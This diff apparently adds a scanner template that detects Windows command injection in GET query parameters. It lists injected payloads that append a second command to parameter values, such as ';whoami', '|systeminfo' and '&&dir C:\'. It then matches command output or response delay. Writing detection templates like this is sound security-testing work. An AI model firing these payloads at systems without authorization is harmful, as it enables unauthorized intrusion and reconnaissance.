@@ -1,0 +1,69 @@
+id: windows-command-injection
+
+info:
+  name: Windows Command Injection - Detection
+  author: pdteam
+  severity: high
+  description: |
+    Detects command injection vulnerabilities in Windows systems using various payload techniques.
+    Command injection allows execution of arbitrary commands on the host operating system via a vulnerable application.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  tags: dast,injection,rce,command-injection,windows
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      windows_fuzz:
+        - ';dir'
+        - '|dir'
+        - '&dir'
+        - '&&dir'
+        - ';whoami'
+        - '|whoami'
+        - '&&whoami'
+        - ';systeminfo'
+        - '|systeminfo'
+        - '&&systeminfo'
+        - ';ipconfig'
+        - '|ipconfig'
+        - '&&ipconfig'
+        - ';dir C:\'
+        - '|dir C:\'
+        - '&&dir C:\'
+        - '&ping -n 5 127.0.0.1&'
+        - '&&ping -n 5 127.0.0.1&&'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{windows_fuzz}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: windows-dir-output
+        part: body
+        regex:
+          - 'Volume in drive [A-Z]'
+          - 'Directory of [A-Z]:\\'
+
+      - type: word
+        name: windows-systeminfo
+        part: body
+        words:
+          - 'Host Name:'
+          - 'OS Name:'
+          - 'Windows IP Configuration'
+
+      - type: dsl
+        name: time-based-windows
+        dsl:
+          - 'duration >= 4'
